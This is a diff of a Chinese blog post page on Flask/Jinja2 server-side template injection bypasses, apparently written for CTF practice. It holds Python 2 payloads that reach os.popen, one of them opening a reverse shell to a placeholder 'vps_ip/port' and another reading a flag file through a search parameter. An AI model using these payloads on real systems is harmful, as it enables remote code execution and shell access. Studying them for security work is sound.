@@ -6,17 +6,17 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="ssti绕过姿势py2与py3的payload有所差异在此区别开来（flask框架最新可能默认URL编码了，有、烦 py21&amp;#123;&amp;#125;.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&amp;quot;bash -i &amp;gt; /dev/tcp/vps_ip/port 0&amp;gt">
+    <meta name="description" content="ssti绕过姿势py2与py3的payload有所差异在此区别开来（flask框架最新可能默认URL编码了，有、烦 py212&amp;#123;&amp;#125;.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&amp;quot;bash -i &amp;gt; /dev/tcp/vps_ip/port 0&amp;g">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ssti姿势">
 <meta property="og:url" content="/2019/09/21/ssti姿势/index.html">
 <meta property="og:site_name" content="dkk-blog">
-<meta property="og:description" content="ssti绕过姿势py2与py3的payload有所差异在此区别开来（flask框架最新可能默认URL编码了，有、烦 py21&amp;#123;&amp;#125;.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&amp;quot;bash -i &amp;gt; /dev/tcp/vps_ip/port 0&amp;gt">
+<meta property="og:description" content="ssti绕过姿势py2与py3的payload有所差异在此区别开来（flask框架最新可能默认URL编码了，有、烦 py212&amp;#123;&amp;#125;.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&amp;quot;bash -i &amp;gt; /dev/tcp/vps_ip/port 0&amp;g">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-09-21T17:09:42.255Z">
+<meta property="og:updated_time" content="2020-04-13T10:19:41.282Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ssti姿势">
-<meta name="twitter:description" content="ssti绕过姿势py2与py3的payload有所差异在此区别开来（flask框架最新可能默认URL编码了，有、烦 py21&amp;#123;&amp;#125;.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&amp;quot;bash -i &amp;gt; /dev/tcp/vps_ip/port 0&amp;gt">
+<meta name="twitter:description" content="ssti绕过姿势py2与py3的payload有所差异在此区别开来（flask框架最新可能默认URL编码了，有、烦 py212&amp;#123;&amp;#125;.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&amp;quot;bash -i &amp;gt; /dev/tcp/vps_ip/port 0&amp;g">
     
     
         
@@ -143,7 +143,7 @@
 
   <div class="content" itemprop="articleBody">
     <h1><span id="ssti绕过姿势">ssti绕过姿势</span></h1><p>py2与py3的<code>payload</code>有所差异在此区别开来<br>（flask框架最新可能默认URL编码了，有、烦</p>
-<h2><span id="py2">py2</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&quot;bash -i &gt; /dev/tcp/vps_ip/port 0&gt;&amp;1 2&gt;&amp;1&quot;).read()</span><br></pre></td></tr></table></figure>
+<h2><span id="py2">py2</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&quot;bash -i &gt; /dev/tcp/vps_ip/port 0&gt;&amp;1 2&gt;&amp;1&quot;).read()</span><br><span class="line">?search=&#123;&#123;%27%27.__class__.__mro__[2].__subclasses__()[59]()._module.linecache.os.popen(&apos;cat /flasklight/coomme_geeeett_youur_flek&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <h2><span id="py3">py3</span></h2><p>参考连接:<br><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">一文看懂Python沙箱逃逸</a><br><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2模板注入中的一些绕过姿势</a><br><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">一篇文章带你理解漏洞之 SSTI 漏洞</a></p>
 
